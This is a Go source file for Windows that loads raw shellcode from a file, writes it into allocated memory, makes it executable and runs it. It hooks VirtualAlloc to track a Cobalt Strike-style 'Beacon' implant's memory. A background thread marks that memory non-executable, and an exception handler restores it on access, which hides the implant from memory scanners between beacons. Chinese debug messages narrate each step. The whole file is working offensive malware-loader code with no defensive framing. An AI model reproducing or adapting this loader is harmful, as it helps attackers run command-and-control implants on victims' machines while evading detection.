package main

import (
	"fmt"
	"github.com/tHinqa/outside-windows/types"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/castaneai/hinako"
)

var (
	hEvent windows.Handle
	Beacon_address uintptr
	Beacon_data_len uintptr
	Beacon_Memory_address_flOldProtect uint32
	Vir_FLAG = true
	shellcode_addr uintptr
)


const EXCEPTION_CONTINUE_SEARCH = 0
const EXCEPTION_CONTINUE_EXECUTION = -1



func main() {
	var shellcode []byte
	if len(os.Args)>1{
		fileObj, err := os.Open(os.Args[1])
		//fileObj, err := os.Open("loader.bin")
		shellcode, err = ioutil.ReadAll(fileObj)
		//shellcode = shellcode1
		if err != nil {
			return
		}

	}
	k32 := syscall.NewLazyDLL("kernel32")




	hEvent,_ = windows.CreateEvent(nil,1,0,nil)

	AddVectoredExceptionHandler := k32.NewProc("AddVectoredExceptionHandler")

	tmp := FirstVectExcepHandler
	ptr1 := *(*uintptr)(unsafe.Pointer(&tmp))

	AddVectoredExceptionHandler.Call(
		1,
		ptr1,
		)

	target := k32.NewProc("VirtualAlloc")
	Hook()


	CreateThread := k32.NewProc("CreateThread")

	tmp1 := Beacon_set_Memory_attributes
	ptr2 := *(*uintptr)(unsafe.Pointer(&tmp1))

	hThread1,_,_ := CreateThread.Call(0, 0, ptr2, 0, 0, 0)

	windows.CloseHandle(windows.Handle(hThread1))


	shellcode_addr,_,_ = target.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT, windows.PAGE_READWRITE)
	Memcpy(shellcode_addr,shellcode)
	windows.VirtualProtect(shellcode_addr,uintptr(len(shellcode)),windows.PAGE_EXECUTE_READWRITE,&Beacon_Memory_address_flOldProtect)

	syscall.Syscall(shellcode_addr, 0, 0, 0, 0)
}

func wstrPtr(str string) uintptr {
	ptr, _ := syscall.UTF16PtrFromString(str)
	return uintptr(unsafe.Pointer(ptr))
}

/*
func funcPC(f interface{}) uintptr {
	return *(*[2]*uintptr)(unsafe.Pointer(&f))[1]
}

 */

func Memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func Beacon_set_Memory_attributes(){
	fmt.Println("Beacon_set_Memory_attributes启动")
	for{
		syscall.WaitForSingleObject(syscall.Handle(hEvent), windows.INFINITE)
		fmt.Println("设置Beacon内存属性不可执行")
		windows.VirtualProtect(Beacon_address, Beacon_data_len, windows.PAGE_READWRITE, &Beacon_Memory_address_flOldProtect)
		windows.ResetEvent(hEvent)
	}
}


func Hook(){

	arch := &hinako.ArchAMD64{}

	//hook VirtualAlloc
	var VirtualA *syscall.Proc
	hook, err := hinako.NewHookByName(arch, "kernel32.dll", "VirtualAlloc",func(hWnd syscall.Handle, dwSize uintptr,flAllocationType uintptr,flProtect uintptr)(int){
		fmt.Println(dwSize)
		Beacon_data_len = dwSize
		Beacon_address ,_, _ = VirtualA.Call(uintptr(hWnd), dwSize, flAllocationType, flProtect)
		fmt.Println("分配大小: ", Beacon_data_len)
		fmt.Println("分配地址:", Beacon_address)
		return int(Beacon_address)
	})
	if err != nil {
		log.Fatalf("failed to hook MessageBoxW: %+v", err)
	}


/*

	//hook Sleep
	var Sleep *syscall.Proc
	hook1, err1 := hinako.NewHookByName(arch, "kernel32.dll", "SleepEx",func(dwMilliseconds uintptr,alerable uintptr){
		if Vir_FLAG{
			windows.VirtualFree(shellcode_addr, 0, windows.MEM_RELEASE)
			Vir_FLAG = false
		}
		fmt.Println("sleep时间:", dwMilliseconds)
		windows.SetEvent(hEvent)
		Sleep.Call(uintptr(dwMilliseconds),alerable)
	})
	if err1 != nil {
		log.Fatalf("failed to hook MessageBoxW: %+v", err1)
	}

 */
	defer hook.Close()
	VirtualA = hook.OriginalProc
	//Sleep = hook1.OriginalProc
}







func FirstVectExcepHandler(pointers types.EXCEPTION_POINTERS)int{

	fmt.Println("FirstVectExcepHandler")
	fmt.Println("异常错误码:", pointers.ExceptionRecord.ExceptionCode)
	fmt.Println("线程地址:", pointers.ContextRecord.Eip)

	if pointers.ExceptionRecord.ExceptionCode == 0xc0000005 && is_Exception(pointers.ContextRecord.Eip){
		fmt.Println("恢复Beacon内存属性")
		windows.VirtualProtect(Beacon_address,Beacon_data_len,syscall.PAGE_EXECUTE_READWRITE,&Beacon_Memory_address_flOldProtect)
		return EXCEPTION_CONTINUE_EXECUTION
	}
	return EXCEPTION_CONTINUE_SEARCH

}

func is_Exception(Exception_addr types.DWORD) bool{
	if uintptr(Exception_addr) < (Beacon_address + Beacon_data_len) && uintptr(Exception_addr) >Beacon_address{
		fmt.Println("地址符合:", Exception_addr)
		return true
	}
	fmt.Println("地址不符合:", Exception_addr)
	return false
}